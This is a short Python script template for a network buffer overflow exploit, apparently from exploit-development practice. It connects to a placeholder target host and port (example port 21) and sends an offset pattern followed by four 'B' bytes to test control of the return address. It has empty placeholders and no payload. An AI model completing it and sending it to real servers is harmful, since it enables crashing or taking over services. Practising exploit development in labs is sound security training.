#!/usr/bin/python

import socket,sys

buffer = #Based on the offset bytes, place your pattern here 
buffer += "B" * 4
RHOST = #IP address of the target machine, example: "10.10.10.0"
RPORT = #Port number of the target machine, example: 21

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    s.send((buffer + "\r\n"))
    s.close()
    
except:
    print("Error connecting to server")
    sys.exit
